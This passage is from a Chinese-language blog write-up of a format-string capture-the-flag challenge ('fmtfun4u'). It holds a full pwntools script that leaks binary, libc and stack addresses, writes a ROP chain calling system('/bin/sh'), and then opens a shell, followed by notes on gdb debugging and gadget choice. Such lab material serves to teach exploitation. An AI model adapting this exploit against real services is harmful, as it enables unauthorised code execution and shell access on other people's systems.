class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#io = process(&quot;./fmtfun4u&quot;)</span><br><span class="line">io = remote(&quot;127.0.0.1&quot;, 4444)</span><br><span class="line">libc = ELF(&quot;./libc.so.6_kali&quot;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">csu_offset = &quot;%8$lx&quot;</span><br><span class="line">libc_start_main_234 = &quot;%9$lx&quot;</span><br><span class="line">loop_times_offset = &quot;%7$x&quot;</span><br><span class="line">rbp_offset = &quot;%10$lx&quot;</span><br><span class="line">rbp_offset2 = &quot;%39$lx&quot;</span><br><span class="line"># leak text base and libc base</span><br><span class="line">io.sendline(csu_offset + &#x27;|&#x27; + libc_start_main_234)</span><br><span class="line">raw_recv = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">csu = int(raw_recv[0], 16)</span><br><span class="line">libc_start_main = int(raw_recv[1], 16) - 234</span><br><span class="line">log.info(&quot;csu is 0x%x&quot; %csu)</span><br><span class="line">log.info(&quot;libc_start_main is 0x%x&quot; %libc_start_main)</span><br><span class="line">binbase = csu - 0xa80</span><br><span class="line">ret = binbase + 0xae4</span><br><span class="line">libcbase = libc_start_main - libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">system = libcbase + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">log.info(&quot;system is 0x%x&quot; %system)</span><br><span class="line">pop_rdi_ret = binbase + 0xae3</span><br><span class="line">pop_r12_r13_r14_r15_ret = binbase + 0xadc</span><br><span class="line">binsh = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">printf_libc = libcbase + libc.symbols[&#x27;printf&#x27;]</span><br><span class="line">log.info(&quot;binbase is 0x%x&quot; %binbase)</span><br><span class="line">log.info(&quot;libcbase is 0x%x&quot; %libcbase)</span><br><span class="line">log.info(&quot;printf is 0x%x&quot; %printf_libc)</span><br><span class="line">log.info(&quot;binsh = 0x%x&quot; %binsh)</span><br><span class="line">io.recvuntil(&quot;Input:&quot;)</span><br><span class="line"># leak stack address</span><br><span class="line">io.sendline(rbp_offset + &#x27;|&#x27; + rbp_offset2)</span><br><span class="line">raw_recv2 = io.recvline()[:-1].split(b&#x27;|&#x27;)</span><br><span class="line">rsp = int(raw_recv2[0], 16) - 0x110</span><br><span class="line">rbp_chain_address = int(raw_recv2[1], 16)</span><br><span class="line">loop_times = int(raw_recv2[0], 16) - 0x100 + 0x4</span><br><span class="line">log.info(&quot;loop_times address is 0x%x&quot; %loop_times)</span><br><span class="line">log.info(&quot;rbp chain is 0x%x&quot; %rbp_chain_address)</span><br><span class="line">log.info(&quot;rsp is 0x%x&quot; %(rsp))</span><br><span class="line"></span><br><span class="line">def modify(addr: int, value: int, Bytes: int):</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    x = addr &amp; 0xffff</span><br><span class="line">    payload = &quot;%&quot; + str(x) + &quot;c&quot; + &quot;%10$hn&quot;</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&quot;Input:&quot;)</span><br><span class="line">    if Bytes == 2:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hn&quot;</span><br><span class="line">    if Bytes == 1:</span><br><span class="line">        payload2 = &quot;%&quot; + str(value) + &quot;c&quot; + &quot;%39$hhn&quot;</span><br><span class="line">    io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"># change i to 65535</span><br><span class="line">modify(loop_times, 0xffff, 2)</span><br><span class="line"># write rop address</span><br><span class="line">modify((rsp+0x8), (pop_r12_r13_r14_r15_ret&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x8+2), ((pop_r12_r13_r14_r15_ret&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x8+4), ((pop_r12_r13_r14_r15_ret&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x30), (pop_rdi_ret&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x30+2), ((pop_rdi_ret&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x30+4), ((pop_rdi_ret&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x38), (binsh&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x38+2), ((binsh&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x38+4), ((binsh&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"></span><br><span class="line">modify((rsp+0x40),   (system&amp;0xffff), 2)</span><br><span class="line">modify((rsp+0x40+2), ((system&amp;0xffff0000) &gt;&gt; 16), 2)</span><br><span class="line">modify((rsp+0x40+4), ((system&amp;0xffff00000000) &gt;&gt; 32), 2)</span><br><span class="line"># overwrite return address to ret</span><br><span class="line">modify((rsp), (ret&amp;0xff), 1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>一步一步用 gdb 來看：<br><img src="/img/Format_string_attack/rbp_chain_13.png" alt=""><br>經過 反覆測試後得知 <code>0x7fff93ca6e30</code> 處無法被改寫，一改寫上去就會發生 EOF Error, 代表那個地方可能是 function return 會需要用到的空間<br>那如果不寫那個地方的話要怎麼構呢？<br>兩個方法，一個是透過上面扣除 rsp 和 rsp + 0x8 的位置，用剩下的空間到 <code>0x7fff93ca6e30</code> 之間構 <code>system(&#39;/bin/sh&#39;)</code><br>或是直接 pop 到 <code>0x7fff93ca6e30</code>, 用下面的空間構 shell, 第一個方法受限於 gadget 沒有符合需求所以沒用<br>這邊使用第二個方法，可以借助 <code>csu</code> 的 gadget 來使用</p>
<p>這是最後的樣子:<br><img src="/img/Format_string_attack/rbp_chain_14.png" alt=""><br><code>0x000055a585bebae4</code> = ret<br><code>0x000055a585bebadc</code> = pop_r12_r13_r14_r15_ret<br><code>0x000055a585bebae3</code> = pop_rdi_ret<br><code>0x00007f89c7ecc156</code> = ‘/bin/sh’<br><code>0x00007f89c7d8adf0</code> = system<br>就是構一個簡單的 ROP</p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2025 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>